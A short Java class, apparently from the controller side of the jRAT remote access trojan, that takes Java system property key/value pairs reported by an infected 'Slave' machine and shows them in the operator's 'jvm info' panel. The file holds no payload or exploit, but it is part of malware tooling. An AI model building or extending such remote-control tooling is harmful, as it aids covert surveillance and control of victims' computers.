package io.jrat.client.packets.incoming;

import io.jrat.client.Slave;
import io.jrat.client.ui.frames.FrameControlPanel;
import io.jrat.client.ui.panels.PanelControlJVMProperties;

import java.io.DataInputStream;


public class Packet44SystemJavaProperty extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		String key = slave.readLine();
		String value = slave.readLine();
		FrameControlPanel frame = FrameControlPanel.instances.get(slave);
		if (frame != null) {
			PanelControlJVMProperties panel = (PanelControlJVMProperties) frame.panels.get("jvm info");
			panel.getModel().addRow(new Object[] { key, value });
		}
	}

}
